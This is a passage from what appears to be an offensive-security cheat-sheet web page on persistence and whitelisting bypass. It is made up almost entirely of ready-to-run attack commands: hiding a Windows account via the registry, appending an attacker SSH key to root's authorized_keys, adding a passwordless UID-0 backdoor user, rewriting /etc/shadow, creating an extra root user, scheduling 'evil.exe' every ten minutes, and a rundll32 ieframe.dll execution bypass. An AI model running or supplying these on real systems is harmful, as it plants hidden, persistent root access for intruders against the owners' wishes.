<div class="highlight"><pre><span></span><code><span class="n">reg</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="s">&quot;HKLM</span><span class="err">\</span><span class="s">SOFTWARE</span><span class="err">\</span><span class="s">Microsoft</span><span class="err">\</span><span class="s">Windows NT</span><span class="err">\</span><span class="s">CurrentVersion</span><span class="err">\</span><span class="s">Winlogon</span><span class="err">\</span><span class="s">SpecialAccounts</span><span class="err">\</span><span class="s">UserList&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="nv">REG_DWORD</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">spotless</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">/</span><span class="n">f</span>
</code></pre></div>
<h3 id="creating-ssh-authorized-keys">Creating SSH Authorized Keys</h3>
<div class="highlight"><pre><span></span><code>mkdir<span class="w"> </span>/root/.ssh<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/root/.ssh/authorized_keys
</code></pre></div>
<h3 id="creating-backdoor-user-wo-password">Creating Backdoor User w/o Password</h3>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;spotless::0:0:root:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd

<span class="c1"># Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is &quot;kali&quot;</span>
sed<span class="w"> </span><span class="s1">&#39;s/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./&#39;</span><span class="w"> </span>/etc/shadow<span class="w"> </span>&gt;<span class="w"> </span>/etc/s2<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/etc/s2<span class="w"> </span>&gt;<span class="w"> </span>/etc/shadow<span class="p">;</span><span class="w"> </span>rm<span class="w"> </span>/etc/s2
</code></pre></div>
<h3 id="creating-another-root-user">Creating Another root User</h3>
<div class="highlight"><pre><span></span><code>useradd<span class="w"> </span>-u0<span class="w"> </span>-g0<span class="w"> </span>-o<span class="w"> </span>-s<span class="w"> </span>/bin/bash<span class="w"> </span>-p<span class="w"> </span><span class="sb">`</span>openssl<span class="w"> </span>passwd<span class="w"> </span>yourpass<span class="sb">`</span><span class="w"> </span>rootuser
</code></pre></div>
<h3 id="generating-openssl-password">Generating OpenSSL Password</h3>
<div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>passwd<span class="w"> </span>-1<span class="w"> </span>password<span class="w"> </span>
<span class="c1"># output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.</span>
</code></pre></div>
<h3 id="persistent-back-doors">Persistent Back Doors</h3>
<div class="highlight"><pre><span></span><code># Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe
</code></pre></div>
<h2 id="code-execution-application-whitelist-bypass">Code Execution / Application Whitelist Bypass</h2>
<h3 id="ieframedll">Ieframe.dll</h3>
<div class="highlight"><pre><span></span><code>rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
</code></pre></div>
<div class="highlight"><pre><span></span><code>[internetshortcut]
url=c:\windows\system32\calc.exe
</code></pre></div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.tabs"], "search": "../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.ad660dcc.min.js"></script>
      
    
  </body>
</html>